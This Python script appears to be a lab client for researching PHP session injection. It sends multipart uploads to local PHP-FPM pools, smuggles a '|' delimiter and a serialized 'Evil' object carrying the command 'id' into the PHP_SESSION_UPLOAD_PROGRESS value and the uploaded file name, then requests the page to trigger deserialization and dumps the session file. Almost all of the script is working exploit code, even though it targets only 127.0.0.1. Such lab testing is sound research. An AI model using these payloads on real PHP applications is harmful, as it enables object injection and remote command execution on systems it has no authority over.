#!/usr/bin/env python3
"""Minimal private lab client: byte-exact multipart for session.upload_progress tests."""
import http.client, sys, os, glob

SESS = "/tmp/opencode/research/phpsessinj_1792633613/labfpm/sess"
B = "----labboundary7f3a"

def mp(name=None, value=b"", filename=None, extra=b""):
    d = b'Content-Disposition: form-data; name="' + name.encode() + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + B.encode() + b"\r\n" + d + b"\r\n" + extra + b"\r\n" + value + b"\r\n"

def body(sid=None, progress=None, filename=b"a.txt", filedata=b"Z", sid_in_body=False):
    out = b""
    if sid and not sid_in_body:
        pass  # cookie carries it
    if sid and sid_in_body:
        out += mp("PHPSESSID", sid.encode())
    if progress is not None:
        out += mp("PHP_SESSION_UPLOAD_PROGRESS", progress)
    out += mp("f", filedata, filename=filename, extra=b'Content-Type: application/octet-stream\r\n')
    return out + b"--" + B.encode() + b"--\r\n"

def post(port, path, b, sid=None):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    h = {"Content-Type": "multipart/form-data; boundary=" + B, "Content-Length": str(len(b))}
    if sid:
        h["Cookie"] = "PHPSESSID=" + sid
    c.request("POST", path, body=b, headers=h)
    r = c.getresponse(); data = r.read(); c.close()
    return r.status, data

def get(port, path, sid):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    c.request("GET", path, headers={"Cookie": "PHPSESSID=" + sid})
    r = c.getresponse(); data = r.read(); c.close()
    return r.status, data

def show(sid):
    p = os.path.join(SESS, "sess_" + sid)
    if not os.path.exists(p):
        print("   file: MISSING", p); return
    raw = open(p, "rb").read()
    print(f"   file: {len(raw)} bytes")
    print("   raw :", raw[:600])

if __name__ == "__main__":
    which = sys.argv[1]
    if which == "w_normal_A":       # baseline write on php_serialize pool
        sid = "labnormalA1"
        st, d = post(9101, "/", body(sid=sid, progress=b"hello"), sid=sid)
        print("status", st, d[:80]); show(sid)
    elif which == "w_pipe_A":       # '|' in progress key, php_serialize pool
        sid = "labpipeA1"
        st, d = post(9101, "/", body(sid=sid, progress=b'x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}'), sid=sid)
        print("status", st, d[:80]); show(sid)
    elif which == "w_pipe_B":       # '|' in progress key, default php pool
        sid = "labpipeB1"
        st, d = post(9102, "/", body(sid=sid, progress=b'x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}'), sid=sid)
        print("status", st, d[:80]); show(sid)
    elif which == "w_filename_B":   # '|'+object in *filename*, default php pool
        sid = "labfileB1"
        st, d = post(9102, "/", body(sid=sid, progress=b"p", filename=b'x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}'), sid=sid)
        print("status", st, d[:80]); show(sid)
    elif which == "trigger":
        sid = sys.argv[2]
        st, d = get(9102, "/", sid)
        print("status", st, d[:200])
    elif which == "sid_body":       # SID via body field, no cookie, use_only_cookies default
        sid = "labbodysid1"
        st, d = post(9102, "/", body(sid=sid, progress=b"bodysid", sid_in_body=True))
        print("status", st, d[:80]); show(sid)
